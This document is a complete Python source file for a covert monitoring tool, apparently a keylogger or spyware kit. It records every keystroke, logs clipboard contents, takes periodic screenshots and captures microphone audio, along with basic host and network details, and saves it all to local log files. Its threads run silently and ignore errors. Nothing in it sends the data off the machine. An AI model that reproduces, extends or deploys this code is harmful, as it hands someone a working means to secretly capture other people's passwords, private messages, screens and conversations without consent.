import os
import threading
import time
from datetime import datetime
from pynput import keyboard
import pyperclip
from PIL import ImageGrab
import wave
import pyaudio
import platform
import socket

LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs")
CLIPBOARD_LOG = os.path.join(LOG_DIR, "clipboard.log")
KEYSTROKE_LOG = os.path.join(LOG_DIR, "keystrokes.log")
SCREENSHOT_DIR = os.path.join(LOG_DIR, "screenshots")
MIC_RECORD_DIR = os.path.join(LOG_DIR, "mic_records")
SYSTEM_INFO_FILE = os.path.join(LOG_DIR, "system_info.txt")

AUDIO_FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 10  # Length of the microphone recording

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(MIC_RECORD_DIR, exist_ok=True)

def log_system_info():
    # Gather basic system information and write to a file.
    try:
        with open(SYSTEM_INFO_FILE, "w") as f:
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"Hostname: {socket.gethostname()}\n")
            f.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
            f.write(f"Platform: {platform.system()} {platform.release()}\n")
            f.write(f"Processor: {platform.processor()}\n")
    except Exception as e:
        print(f"Failed to write system info: {e}")

def log_clipboard():
    # Periodically check clipboard content and log changes.
    last_clipboard = ""
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard and current_clipboard.strip():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(CLIPBOARD_LOG, "a") as f:
                    f.write(f"[{timestamp}] Clipboard changed:\n{current_clipboard}\n\n")
                last_clipboard = current_clipboard
        except Exception:
            pass
        time.sleep(5)

def on_press(key):
    # Log each key press to a file.
    try:
        with open(KEYSTROKE_LOG, "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key.name}]")
    except Exception:
        pass

def take_screenshot():
    # Take periodic screenshots every 60 seconds.
    while True:
        try:
            img = ImageGrab.grab()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            img.save(os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png"))
        except Exception:
            pass
        time.sleep(60)

def record_microphone():
    # Record audio from the microphone for a fixed duration.
    while True:
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=AUDIO_FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []

            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(MIC_RECORD_DIR, f"mic_{timestamp}.wav")

            wf = wave.open(filename, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(AUDIO_FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
        except Exception:
            pass
        time.sleep(300)  # Record every 5 minutes

def main():
    log_system_info()

    # Start clipboard monitoring thread
    clipboard_thread = threading.Thread(target=log_clipboard, daemon=True)
    clipboard_thread.start()

    # Start screenshot thread
    screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
    screenshot_thread.start()

    # Start microphone recording thread
    mic_thread = threading.Thread(target=record_microphone, daemon=True)
    mic_thread.start()

    # Start keyboard listener (blocking)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
